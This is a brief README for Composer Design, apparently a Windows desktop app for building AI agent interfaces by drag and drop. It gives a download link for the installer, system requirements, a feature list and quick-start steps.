# Composer Design

**Composer Design** is a desktop application for visually designing AI agent user interfaces. Drag-and-drop components, configure behaviors, and export directly to your project.

## Download

[Download Composer.Design-default-setup.exe](https://github.com/Hawiyat-Org/composer-design/releases/download/v0.11.1-composer.13/Composer.Design-default-setup.exe)

> Direct download — starts immediately, no GitHub redirect.

### System Requirements

| Requirement | Minimum |
|-------------|---------|
| OS | Windows 10+ (64-bit) |
| RAM | 4 GB |
| Disk | 500 MB free |
| Internet | Required for first-time setup |

### What you get

- Visual drag-and-drop UI builder for AI agents
- Component library with pre-built blocks
- Real-time preview
- Export to code (React, Next.js, plain HTML)
- Project templates to start fast

## Quick Start

1. Download the installer above
2. Run `Composer.Design-default-setup.exe`
3. Follow the setup wizard
4. Launch Composer Design and start building
